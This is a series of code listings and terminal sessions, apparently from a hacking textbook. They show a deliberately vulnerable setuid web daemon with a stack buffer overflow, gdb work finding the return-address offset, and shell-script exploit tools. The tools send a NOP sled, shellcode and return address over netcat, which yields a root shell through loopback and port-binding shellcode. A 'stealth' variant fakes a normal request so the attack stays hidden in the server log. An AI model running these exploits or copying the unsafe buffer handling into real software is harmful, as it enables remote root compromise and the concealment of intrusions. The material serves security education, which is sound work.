["```\nDAEMON(3)                  Linux Programmer's Manual                 DAEMON(3)\n\nNAME\n\n       daemon - run in the background\n\nSYNOPSIS\n       #include <unistd.h>\n\n       int daemon(int nochdir, int noclose);\n\nDESCRIPTION\n       The daemon() function is for programs wishing to detach themselves from\n       the controlling terminal and run in the background as system daemons.\n\n       Unless the argument nochdir is non-zero, daemon() changes the current\n       working directory to the root (\"/\").\n\n       Unless the argument noclose is non-zero, daemon() will redirect stan\n       dard input, standard output and standard error to /dev/null.\n\nRETURN VALUE\n       (This function forks, and if the   fork()  succeeds,  the  parent  does\n       _exit(0),  so that further errors are seen by the child only.)  On suc\n       cess zero will be returned.  If an error occurs,  daemon()  returns  -1\n       and  sets  the global variable errno to any of the errors specified for\n       the library functions fork(2) and setsid(2).\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <signal.h>\n/* Some labeled signal defines from signal.h\n * #define SIGHUP        1  Hangup\n * #define SIGINT        2  Interrupt  (Ctrl-C)\n * #define SIGQUIT       3  Quit (Ctrl-\\)\n * #define SIGILL        4  Illegal instruction\n * #define SIGTRAP       5  Trace/breakpoint trap\n * #define SIGABRT       6  Process aborted\n * #define SIGBUS        7  Bus error\n * #define SIGFPE        8  Floating point error\n * #define SIGKILL       9  Kill\n * #define SIGUSR1      10  User defined signal 1\n * #define SIGSEGV      11  Segmentation fault\n * #define SIGUSR2      12  User defined signal 2\n * #define SIGPIPE      13  Write to pipe with no one reading\n * #define SIGALRM      14  Countdown alarm set by alarm()\n * #define SIGTERM      15  Termination (sent by kill command)\n * #define SIGCHLD      17  Child process signal\n * #define SIGCONT      18  Continue if stopped\n * #define SIGSTOP      19  Stop (pause execution)\n * #define SIGTSTP      20  Terminal stop [suspend] (Ctrl-Z)\n * #define SIGTTIN      21  Background process trying to read stdin\n * #define SIGTTOU      22  Background process trying to read stdout\n */\n\n/* A signal handler */\nvoid signal_handler(int signal) {\n   printf(\"Caught signal %d\\t\", signal);\n   if (signal == SIGTSTP)\n      printf(\"SIGTSTP (Ctrl-Z)\");\n   else if (signal == SIGQUIT)\n      printf(\"SIGQUIT (Ctrl-\\\\)\");\n   else if (signal == SIGUSR1)\n      printf(\"SIGUSR1\");\n   else if (signal == SIGUSR2)\n      printf(\"SIGUSR2\");\n   printf(\"\\n\");\n}\n\nvoid sigint_handler(int x) {\n   printf(\"Caught a Ctrl-C (SIGINT) in a separate handler\\nExiting.\\n\");\n   exit(0);\n}\n\nint main() {\n   /* Registering signal handlers */\n   signal(SIGQUIT, signal_handler); // Set signal_handler() as the\n   signal(SIGTSTP, signal_handler); // signal handler for these\n   signal(SIGUSR1, signal_handler); // signals.\n   signal(SIGUSR2, signal_handler);\n\n   signal(SIGINT, sigint_handler); // Set sigint_handler() for SIGINT.\n\n   while(1) {} // Loop forever.\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o signal_example signal_example.c\nreader@hacking:~/booksrc $ ./signal_example\nCaught signal 20        SIGTSTP (Ctrl-Z)\nCaught signal 3 SIGQUIT (Ctrl-\\)\nCaught a Ctrl-C (SIGINT) in a separate handler\nExiting.\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ kill -l\n 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL\n 5) SIGTRAP      6) SIGABRT      7) SIGBUS       8) SIGFPE\n 9) SIG KILL     10) SIGUSR1     11) SIGSEGV     12) SIGUSR2\n13) SIGPIPE     14) SIGALRM     15) SIGTERM     16) SIGSTKFLT\n17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP\n21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU\n25) SIGXFSZ     26) SIGVTALRM   27) SIGPROF     28) SIGWINCH\n29) SIGIO       30) SIGPWR      31) SIGSYS      34) SIGRTMIN\n35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3  38) SIGRTMIN+4\n39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8\n43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12\n47) SIGRTMIN+13 48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14\n51) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-10\n55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7  58) SIGRTMAX-6\n59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2\n63) SIGRTMAX-1  64) SIGRTMAX\nreader@hacking:~/booksrc $ ps a | grep signal_example\n24491 pts/3    R+     0:17 ./signal_example\n24512 pts/1    S+     0:00  grep signal_example\nreader@hacking:~/booksrc $  kill -10 24491\nreader@hacking:~/booksrc $  kill -12 24491\nreader@hacking:~/booksrc $  kill -9 24491\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./signal_example\nCaught signal 10        SIGUSR1\nCaught signal 12        SIGUSR2\nKilled\nreader@hacking:~/booksrc $\n```", "```\n#include <sys/stat.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n`#include <time.h> #include <signal.h>`\n#include \"hacking.h\"\n#include \"hacking-network.h\"\n\n#define PORT 80   // The port users will be connecting to\n#define WEBROOT \"./webroot\" // The webserver's root directory\n`#define LOGFILE \"/var/log/tinywebd.log\" // Log filename  int logfd, sockfd;  // Global log and socket file descriptors void handle_connection(int, struct sockaddr_in *, int);`\nint get_file_size(int); // Returns the file size of open file descriptor\n`void timestamp(int); // Writes a timestamp to the open file descriptor  // This function is called when the process is killed. void handle_shutdown(int signal) {    timestamp(logfd);    write(logfd, \"Shutting down.\\n\", 16);    close(logfd);    close(sockfd);    exit(0); }`\n\nint main(void) {\n   int new_sockfd, yes=1;\n   struct sockaddr_in host_addr, client_addr;   // My address information\n   socklen_t sin_size;\n\n   `logfd = open(LOGFILE, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);    if(logfd == -1)       fatal(\"opening log file\");`\n\n   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\n      fatal(\"in socket\");\n\n   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\n      fatal(\"setting socket option SO_REUSEADDR\");\n\n   `printf(\"Starting tiny web daemon.\\n\");    if(daemon(1, 0) == -1) // Fork to a background daemon process.       fatal(\"forking to daemon process\");     signal(SIGTERM, handle_shutdown);    // Call handle_shutdown when killed.    signal(SIGINT, handle_shutdown);    // Call handle_shutdown when interrupted.     timestamp(logfd);    write(logfd, \"Starting up.\\n\", 15);`\n   host_addr.sin_family = AF_INET;      // Host byte order\n   host_addr.sin_port = htons(PORT);    // Short, network byte order\n   host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\n   memset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\n\n   if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\n      fatal(\"binding to socket\");\n\n   if (listen(sockfd, 20) == -1)\n      fatal(\"listening on socket\");\n\n   while(1) { // Accept loop.\n      sin_size = sizeof(struct sockaddr_in);\n      new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n      if(new_sockfd == -1)\n         fatal(\"accepting connection\");\n\n      `handle_connection(new_sockfd, &client_addr, logfd);`\n   }\n   return 0;\n}\n\n`/* This function handles the connection on the passed socket from the  *.passed client address and logs to the passed FD. The connection is  *.processed as a web request and this function replies over the connected  *.socket. Finally, the passed socket is closed at the end of the function.  */ void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {`\n   unsigned char *ptr, request[500], resource[500], `log_buffer[500]`;\n   int fd, length;\n\n   length = recv_line(sockfd, request);\n\n   `sprintf(log_buffer, \"From %s:%d \\\"%s\\\"\\t\", inet_ntoa(client_addr_ptr->sin_addr), ntohs(client_addr_ptr->sin_port), request);`\n\n   ptr = strstr(request, \" HTTP/\"); // Search for valid-looking request.\n   if(ptr == NULL) { // Then this isn't valid HTTP\n      strcat(log_buffer, \" NOT HTTP!\\n\");\n   } else {\n      *ptr = 0; // Terminate the buffer at the end of the URL.\n      ptr = NULL; // Set ptr to NULL (used to flag for an invalid request).\n      if(strncmp(request, \"GET \", 4) == 0)  // Get request\n         ptr = request+4; // ptr is the URL.\n      if(strncmp(request, \"HEAD \", 5) == 0) // Head request\n         ptr = request+5; // ptr is the URL.\n      if(ptr == NULL) { // Then this is not a recognized request\n         strcat(log_buffer, \" UNKNOWN REQUEST!\\n\");\n      } else { // Valid request, with ptr pointing to the resource name\n         if (ptr[strlen(ptr) - 1] == '/')  // For resources ending with '/',\n             strcat(ptr, \"index.html\");    // add 'index.html' to the end.\n         strcpy(resource, WEBROOT);     // Begin resource with web root path\n         strcat(resource, ptr);         //  and join it with resource path.\n         fd = open(resource, O_RDONLY, 0); // Try to open the file.\n         if(fd == -1) { // If file is not found\n            `strcat(log_buffer, \" 404 Not Found\\n\");`\n            send_string(sockfd, \"HTTP/1.0 404 NOT FOUND\\r\\n\");\n            send_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\n            send_string(sockfd, \"<html><head><title>404 Not Found</title></head>\");\n            send_string(sockfd, \"<body><h1>URL not found</h1></body></html>\\r\\n\");\n         } else {      // Otherwise, serve up the file.\n            `strcat(log_buffer, \" 200 OK\\n\");`\n            send_string(sockfd, \"HTTP/1.0 200 OK\\r\\n\");\n            send_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\n            if(ptr == request + 4) { // Then this is a GET request\n               if( (length = get_file_size(fd)) == -1)\n                  fatal(\"getting resource file size\");\n               if( (ptr = (unsigned char *) malloc(length)) == NULL)\n                  fatal(\"allocating memory for reading resource\");\n               read(fd, ptr, length);  // Read the file into memory.\n               send(sockfd, ptr, length, 0);  // Send it to socket.\n               free(ptr); // Free file memory.\n         }\n         close(fd); // Close the file.\n         } // End if block for file found/not found.\n      } // End if block for valid request.\n   } // End if block for valid HTTP.\n   `timestamp(logfd);    length = strlen(log_buffer);    write(logfd, log_buffer, length); // Write to the log.`\n\n   shutdown(sockfd, SHUT_RDWR); // Close the socket gracefully.\n}\n\n/* This function accepts an open file descriptor and returns\n * the size of the associated file. Returns -1 on failure.\n */\nint get_file_size(int fd) {\n   struct stat stat_struct;\n\n   if(fstat(fd, &stat_struct) == -1)\n      return -1;\n   return (int) stat_struct.st_size;\n}\n`/* This function writes a timestamp string to the open file descriptor  *.passed to it.  */ void timestamp(fd) {    time_t now;    struct tm *time_struct;    int length;    char time_buffer[40];     time(&now);  // Get number of seconds since epoch.    time_struct = localtime((const time_t *)&now); // Convert to tm struct.    length = strftime(time_buffer, 40, \"%m/%d/%Y %H:%M:%S> \", time_struct);    write(fd, time_buffer, length); // Write timestamp string to log. }`\n```", "```\nreader@hacking:~/booksrc $ gcc -o tinywebd tinywebd.c\nreader@hacking:~/booksrc $ sudo chown root ./tinywebd\nreader@hacking:~/booksrc $ sudo chmod u+s ./tinywebd\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\n\nreader@hacking:~/booksrc $ ./webserver_id 127.0.0.1\nThe web server for 127.0.0.1 is Tiny webserver\nreader@hacking:~/booksrc $ ps ax | grep tinywebd\n25058 ?        Ss     0:00 ./tinywebd\n25075 pts/3    R+     0:00 grep tinywebd\nreader@hacking:~/booksrc $ kill 25058\nreader@hacking:~/booksrc $ ps ax | grep tinywebd\n25121 pts/3    R+     0:00 grep tinywebd\nreader@hacking:~/booksrc $ cat /var/log/tinywebd.log\ncat: /var/log/tinywebd.log: Permission denied\nreader@hacking:~/booksrc $ sudo cat /var/log/tinywebd.log\n07/22/2007 17:55:45> Starting up.\n07/22/2007 17:57:00> From 127.0.0.1:38127 \"HEAD / HTTP/1.0\"     200 OK\n07/22/2007 17:57:21> Shutting down.\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q ./a.out\n\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 47\n42\n43         if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\n44            fatal(\"setting socket option SO_REUSEADDR\");\n45\n46         printf(\"Starting tiny web daemon.\\n\");\n47         if(daemon(1, 1) == -1) // Fork to a background daemon process.\n48            fatal(\"forking to daemon process\");\n49\n50         signal(SIGTERM, handle_shutdown);   // Call handle_shutdown when killed.\n51         signal(SIGINT, handle_shutdown);   // Call handle_shutdown when interrupted.\n(gdb) break 50\nBreakpoint 1 at 0x8048e84: file tinywebd.c, line 50.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nStarting tiny web daemon.\n\nProgram exited normally.\n(gdb)\n```", "```\n(gdb) set follow-fork-mode child\n(gdb) help set follow-fork-mode\nSet debugger response to a program call of fork or vfork.\nA fork or vfork creates a new process.  follow-fork-mode can be:\n  parent  - the original process is debugged after a fork\n  child   - the new process is debugged after a fork\nThe unfollowed process will continue to run.\nBy default, the debugger will follow the parent process.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nStarting tiny web daemon.\n[Switching to process 1051]\n\nBreakpoint 1, main () at tinywebd.c:50\n50         signal(SIGTERM, handle_shutdown);   // Call handle_shutdown when killed.\n(gdb) quit\nThe program is running.  Exit anyway? (y or n) y\nreader@hacking:~/booksrc $ ps aux | grep a.out\nroot       911  0.0  0.0   1636   416 ?        Ss   06:04  0:00 /home/reader/booksrc/a.out\nreader    1207 0.0 0.0     2880   748 pts/2    R+   06:13  0:00 grep a.out\nreader@hacking:~/booksrc $ sudo kill 911\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon..\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot     25830  0.0  0.0   1636   356 ?        Ss   20:10   0:00 ./tinywebd\nreader   25837  0.0  0.0   2880   748 pts/1    R+   20:10   0:00 grep tinywebd\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q—pid=25830 --symbols=./a.out\n\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nAttaching to process 25830\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already.  Kill it? (y or n) n\nProgram not killed.\n(gdb) bt\n#0  0xb7fe77f2 in ?? ()\n#1  0xb7f691e1 in ?? ()\n#2  0x08048f87 in main () at tinywebd.c:68\n(gdb) list 68\n63         if (listen(sockfd, 20) == -1)\n64            fatal(\"listening on socket\");\n65\n66         while(1) {   // Accept loop\n67            sin_size = sizeof(struct sockaddr_in);\n68            new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n69            if(new_sockfd == -1)\n70               fatal(\"accepting connection\");\n71\n72            handle_connection(new_sockfd, &client_addr, logfd);\n(gdb) list handle_connection\n77      /* This function handles the connection on the passed socket from the\n78       * passed client address and logs to the passed FD. The connection is\n79       * processed as a web request, and this function replies over the connected\n80       * socket. Finally, the passed socket is closed at the end of the function.\n81       */\n82      void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd)\n {\n83         unsigned char *ptr, request[500], resource[500], log_buffer[500];\n84         int fd, length;\n85\n86         length = recv_line(sockfd, request);\n(gdb) break 86\nBreakpoint 1 at 0x8048fc3: file tinywebd.c, line 86.\n(gdb) cont\nContinuing.\n```", "```\nBreakpoint 1, handle_connection (sockfd=5, client_addr_ptr=0xbffff810) at tinywebd.c:86\n86         length = recv_line(sockfd, request);\n(gdb) bt\n#0  handle_connection (sockfd=5, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86\n#1  0x08048fb7 in main () at tinywebd.c:72\n(gdb) x/x request\n0xbffff5c0:     0x080484ec\n(gdb) x/16x request + 500\n0xbffff7b4:     0xb7fd5ff4      0xb8000ce0      0x00000000      0xbffff848\n0xbffff7c4:     0xb7ff9300      0xb7fd5ff4      0xbffff7e0      0xb7f691c0\n0xbffff7d4:     0xb7fd5ff4      0xbffff848      0x08048fb7      0x00000005\n0xbffff7e4:     0xbffff810      0x00000003      0xbffff838      0x00000004\n(gdb) x/x 0xbffff7d4 + 8\n0xbffff7dc:     0x08048fb7\n(gdb) p /x 0xbffff7dc - 0xbffff5c0\n$1 = 0x21c\n(gdb) p 0xbffff7dc - 0xbffff5c0\n$2 = 540\n(gdb) p /x 0xbffff5c0 + 100\n$3 = 0xbffff624\n(gdb) quit\nThe program is running. Quit anyway (and detach it)? (y or n) y\nDetaching from program: , process 25830\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ wc -c loopback_shell\n83 loopback_shell\n\nreader@hacking:~/booksrc $ echo $((540+4 - (32*4) - 83))\n333\nreader@hacking:~/booksrc $ nc -l -p 31337 &\n[1] 9835\nreader@hacking:~/booksrc $ jobs\n[1]+ Running                  nc -l -p 31337 &\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x333'; cat loopback_shell; perl -e\n 'print \"\\\nx24\\xf6\\xff\\xbf\"x32 . \"\\r\\n\"') | nc -w 1 -v 127.0.0.1 80\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ fg\nnc -l -p 31337\nwhoami\nroot\n```", "```\n#!/bin/sh\n# A tool for exploiting tinywebd\n\nif [ -z \"$2\" ]; then # If argument 2 is blank\n   echo \"Usage: $0 <shellcode file> <target IP>\"\n   exit\nfi\nOFFSET=540\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\necho \"target IP: $2\"\nSIZE=`wc -c $1 | cut -f1 -d ' '`\necho \"shellcode: $1 ($SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE))\n\necho \"[NOP ($ALIGNED_SLED_SIZE bytes)] [shellcode ($SIZE bytes)] [ret addr\n($((4*32)) bytes)]\"\n( perl -e \"print \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\n cat $1;\n perl -e \"print \\\"$RETADDR\\\"x32 . \\\"\\r\\n\\\"\";) | nc -w 1 -v $2 80\n```", "```\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ ./xtool_tinywebd.sh portbinding_shellcode 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: portbinding_shellcode (92 bytes)\n[NOP (324 bytes)] [shellcode (92 bytes)] [ret addr (128 bytes)]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337\nlocalhost [127.0.0.1] 31337 (?) open\nwhoami\nroot\n```", "```\nreader@hacking:~/booksrc $ sudo cat /var/log/tinywebd.log\n07/25/2007 14:55:45> Starting up.\n07/25/2007 14:57:00> From 127.0.0.1:38127 \"HEAD / HTTP/1.0\"      200 OK\n07/25/2007 17:49:14> From 127.0.0.1:50201 \"GET / HTTP/1.1\"       200 OK\n07/25/2007 17:49:14> From 127.0.0.1:50202 \"GET /image.jpg HTTP/1.1\"      200 OK\n07/25/2007 17:49:14> From 127.0.0.1:50203 \"GET /favicon.ico HTTP/1.1\"    404 Not Found\n07/25/2007 17:57:21> Shutting down.\n08/01/2007 15:43:08> Starting up.\n08/01/2007 15:43:41> From 127.0.0.1:45396 \"␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣\n␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣\n␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣\n␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣jfX␣1␣CRj j ␣␣ ␣jfXCh ␣␣\n f␣T$ fhzifS␣␣j OV␣␣C ␣␣␣␣I␣? Iy␣␣\n                                  Rh//shh/bin␣␣R␣␣S␣␣ $␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣\n␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣\n␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣$␣␣␣\" NOT HTTP!\nreader@hacking:~/booksrc $\n```", "```\n07/22/2007 17:57:00> From 127.0.0.1:38127 \"HEAD / HTTP/1.0\"   200 OK\n07/25/2007 14:49:14> From 127.0.0.1:50201 \"GET / HTTP/1.1\"    200 OK\n07/25/2007 14:49:14> From 127.0.0.1:50202 \"GET /image.jpg HTTP/1.1\"   200 OK\n07/25/2007 14:49:14> From 127.0.0.1:50203 \"GET /favicon.ico HTTP/1.1\"    404 Not Found\n```", "```\n#!/bin/sh\n# stealth exploitation tool\nif [ -z \"$2\" ]; then # If argument 2 is blank\n   echo \"Usage: $0 <shellcode file> <target IP>\"\n   exit\nfi\nFAKEREQUEST=\"GET / HTTP/1.1\\x00\"\nFR_SIZE=$(perl -e \"print \\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nOFFSET=540\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\necho \"target IP: $2\"\nSIZE=`wc -c $1 | cut -f1 -d ' '`\necho \"shellcode: $1 ($SIZE bytes)\"\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE))\n\necho \"[Fake Request ($FR_SIZE b)] [NOP ($ALIGNED_SLED_SIZE b)] [shellcode\n($SIZE b)] [ret addr ($((4*32)) b)]\"\n(perl -e \"print \\\"$FAKEREQUEST\\\" . \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\n cat $1;\n perl -e \"print \\\"$RETADDR\\\"x32 . \\\"\\r\\n\\\"\") | nc -w 1 -v $2 80\n```", "```\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ nc -l -p 31337 &\n[1] 7714\nreader@hacking:~/booksrc $ jobs\n[1]+ Running                  nc -l -p 31337 &\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh loopback_shell 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: loopback_shell (83 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request (15 b)] [NOP (318 b)] [shellcode (83 b)] [ret addr (128 b)]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ fg\nnc -l -p 31337\nwhoami\nroot\n```", "```\n08/02/2007 13:37:36> Starting up..\n08/02/2007 13:37:44> From 127.0.0.1:32828 \"GET / HTTP/1.1\"      200 OK\n```", "```\nreader@hacking:~/booksrc $ strace ./notetaker test\nexecve(\"./notetaker\", [\"./notetaker\", \"test\"], [/* 27 vars */]) = 0\nbrk(0)                                  = 0x804a000\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe5000\naccess(\"/etc/ld.so.preload\", R_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/etc/ld.so.cache\", O_RDONLY)      = 3\nfstat64(3, {st_mode=S_IFREG|0644, st_size=70799, ..}) = 0\nmmap2(NULL, 70799, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd3000\nclose(3)                                = 0\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/lib/tls/i686/cmov/libc.so.6\", O_RDONLY) = 3\nread(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\0`\\1\\000\".., 512) = 512\nfstat64(3, {st_mode=S_IFREG|0644, st_size=1307104, ..}) = 0\nmmap2(NULL, 1312164, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e92000\nmmap2(0xb7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3,\n 0x13b) =\n0xb7fcd000\nmmap2(0xb7fd0000, 9636, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0)\n =\n0xb7fd0000\nclose(3)                                = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e91000\nset_thread_area({entry_number:-1 -> 6, base_addr:0xb7e916c0, limit:1048575, seg_32bit:1,\ncontents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0\nmprotect(0xb7fcd000, 4096, PROT_READ)   = 0\nmunmap(0xb7fd3000, 70799)               = 0\nbrk(0)                                  = 0x804a000\nbrk(0x806b000)                          = 0x806b000\nfstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ..}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe4000\nwrite(1, \"[DEBUG] buffer   @ 0x804a008: \\'t\".., 37[DEBUG] buffer @ 0x804a008: 'test'\n) = 37\nwrite(1, \"[DEBUG] datafile @ 0x804a070: \\'/\".., 43[DEBUG] datafile @ 0x804a070:\n '/var/notes'\n) = 43\n`open(\"/var/notes\", O_WRONLY|O_APPEND|O_CREAT, 0600) = -1 EACCES (Permission denied)`\ndup(2)                                  = 3\nfcntl64(3, F_GETFL)                     = 0x2 (flags O_RDWR)\nfstat64(3, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ..}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe3000\n_llseek(3, 0, 0xbffff4e4, SEEK_CUR)     = -1 ESPIPE (Illegal seek)\nwrite(3, \"[!!] Fatal Error in main() while\".., 65[!!] Fatal Error in main() while opening \nfile:\nPermission denied\n) = 65\nclose(3)                                = 0\nmunmap(0xb7fe3000, 4096)                = 0\nexit_group(-1)                          = ?\nProcess 21473 detached\nreader@hacking:~/booksrc $ grep open notetaker.c\n         fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\n                fatal(\"in main() while opening file\");\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q ./notetaker\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) set dis intel\n(gdb) disass main\nDump of assembler code for function main:\n0x0804875f <main+0>:    push   ebp\n0x08048760 <main+1>:    mov    ebp,esp\n0x08048762 <main+3>:    sub    esp,0x28\n0x08048765 <main+6>:    and    esp,0xfffffff0\n0x08048768 <main+9>:    mov    eax,0x0\n0x0804876d <main+14>:   sub    esp,eax\n0x0804876f <main+16>:   mov    DWORD PTR [esp],0x64\n0x08048776 <main+23>:   call   0x8048601 <ec_malloc>\n0x0804877b <main+28>:   mov    DWORD PTR [ebp-12],eax\n0x0804877e <main+31>:   mov    DWORD PTR [esp],0x14\n0x08048785 <main+38>:   call   0x8048601 <ec_malloc>\n0x0804878a <main+43>:   mov    DWORD PTR [ebp-16],eax\n0x0804878d <main+46>:   mov    DWORD PTR [esp+4],0x8048a9f\n0x08048795 <main+54>:   mov    eax,DWORD PTR [ebp-16]\n0x08048798 <main+57>:   mov    DWORD PTR [esp],eax\n0x0804879b <main+60>:   call   0x8048480 <strcpy@plt>\n0x080487a0 <main+65>:   cmp    DWORD PTR [ebp+8],0x1\n0x080487a4 <main+69>:   jg     0x80487ba <main+91>\n0x080487a6 <main+71>:   mov    eax,DWORD PTR [ebp-16]\n0x080487a9 <main+74>:   mov    DWORD PTR [esp+4],eax\n0x080487ad <main+78>:   mov    eax,DWORD PTR [ebp+12]\n0x080487b0 <main+81>:   mov    eax,DWORD PTR [eax]\n0x080487b2 <main+83>:   mov    DWORD PTR [esp],eax\n0x080487b5 <main+86>:   call   0x8048733 <usage>\n0x080487ba <main+91>:   mov    eax,DWORD PTR [ebp+12]\n0x080487bd <main+94>:   add    eax,0x4\n0x080487c0 <main+97>:   mov    eax,DWORD PTR [eax]\n0x080487c2 <main+99>:   mov    DWORD PTR [esp+4],eax\n0x080487c6 <main+103>:  mov    eax,DWORD PTR [ebp-12]\n0x080487c9 <main+106>:  mov    DWORD PTR [esp],eax\n0x080487cc <main+109>:  call   0x8048480 <strcpy@plt>\n0x080487d1 <main+114>:  mov    